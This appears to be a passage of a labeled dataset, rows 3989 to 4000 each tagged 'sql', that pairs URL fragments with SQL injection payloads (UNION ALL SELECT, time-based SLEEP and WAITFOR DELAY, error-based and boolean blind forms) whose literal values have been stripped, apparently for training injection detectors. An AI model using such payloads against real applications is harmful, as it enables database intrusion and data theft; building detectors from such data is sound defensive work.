3989,sql,". . ? = & = & =   ' ) ) ) AND =  -- "
3990,sql,". . . . / ? = & = & = & =   % ' ) AND =  -- "
3991,sql,". . / / / ? =  - ' ) UNION ALL SELECT , , , , , # "
3992,sql,". . / / / / ? = & = & =   ' ; WAITFOR DELAY ' : : '  --"
3993,sql,". . . / / / / ? = & = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL # "
3994,sql,". . / / ? =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' DCWR ' = ' "
3995,sql,". . / / ? =   "" ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Irzi ) AND ( ( " Rqel " = " "
3996,sql,". . ? = & = & =   % ' UNION ALL SELECT NULL , NULL , NULL # "
3997,sql,". . . / / / ? = & =   ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' rTXI ' = ' "
3998,sql,". . . . / ? = & = & =   "" ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( " giDE " = " "
3999,sql,". . . / / / ? =   % ' ) AND SLEEP ( ) # "
4000,sql,". . . . / ? = & = & = & =  - % ' ) ) UNION ALL SELECT , , , # "
